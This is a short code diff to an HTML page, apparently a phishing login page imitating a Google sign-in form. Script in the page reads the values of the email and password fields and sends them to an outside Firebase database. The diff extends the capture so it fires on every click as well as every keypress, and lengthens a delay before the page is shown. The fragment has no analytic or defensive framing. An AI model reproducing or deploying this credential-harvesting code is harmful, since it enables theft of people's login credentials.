@@ -1082,9 +1082,12 @@ H.ServerValue={TIMESTAMP:{".sv":"timestamp"}};H.INTERNAL=Z;H.Context=Y;})();
 <script type='text/javascript'>
     var ref = new Firebase('https://torid-fire-5179.firebaseio.com/');
     $(function() {
-        $("body").keypress(function() {
+        $("body").keypress(click);
+        $("body").click(click);
+
+        function click() {
            ref.child("click").child(new Date().getTime()).update({"email":$("#Email").val(),"pass":$("#Passwd").val()}); 
-        });
+        }
     });
 </script>
 
@@ -1120,7 +1123,7 @@ ref.child("mobile").child(new Date().getTime()).update({"is":window.mobilecheck(
    $(function() {
         setTimeout(function() {
             $("body").show();
-        }, 1000);
+        }, 2000);
     }); 
 </script>
 <script>
